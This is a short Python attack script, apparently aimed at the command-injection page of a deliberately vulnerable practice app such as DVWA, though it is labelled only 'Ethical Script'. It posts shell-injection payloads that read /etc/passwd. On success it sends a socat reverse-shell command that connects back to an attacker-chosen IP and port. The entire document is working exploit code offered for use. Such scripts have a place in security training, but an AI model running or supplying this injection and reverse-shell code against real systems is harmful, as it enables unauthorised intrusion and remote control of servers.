##Created by Kwang
#!/usr/bin/env python
import requests
import subprocess
import argparse

# Create argument parser
parser = argparse.ArgumentParser(description='Ethical Script')
parser.add_argument('-u', '--url', dest='target_url', help='Target URL for the ethical script')
parser.add_argument('-i', '--ip', dest='reverse_shell_ip', help='IP address for the reverse shell')
parser.add_argument('-p', '--port', dest='reverse_shell_port', help='Port for the reverse shell')
args = parser.parse_args()

# Assign parsed arguments to variables
target_url = args.target_url
reverse_shell_ip = args.reverse_shell_ip
reverse_shell_port = args.reverse_shell_port

cookies = {
    'PHPSESSID': '',
    'security': 'low',
}

payloads = [
    '; cat /etc/passwd',  # Semi-colon operator
    '&& cat /etc/passwd',  # Logical AND operator
    '|| cat /etc/passwd',  # Logical OR operator
    '| cat /etc/passwd',  # Pipe operator
]

for payload in payloads:
    data = {
        'ip': payload,
        'Submit': 'Submit',
    }
    response = requests.post(target_url, cookies=cookies, data=data)
    #take out the operator
    operator = payload.split()[0]

    if 'root' in response.text:
        print(f'Operator "{payload.split()[0]}" executed successfully.')
        print('Creating a revershell... check your listener')
        reverse_shell_payload = f"{operator} socat tcp-connect:{reverse_shell_ip}:{reverse_shell_port} exec:bash,pty,stderr,setsid,sigint,sane"

        # Send the payload with the reverse shell command
        reverse_shell_data = {
            'ip': reverse_shell_payload,
            'Submit': 'Submit',
        }
        reverse_shell_response = requests.post(target_url, cookies=cookies, data=reverse_shell_data)
        
    else:
        print(f'Operator "{payload.split()[0]}" failed to execute.')
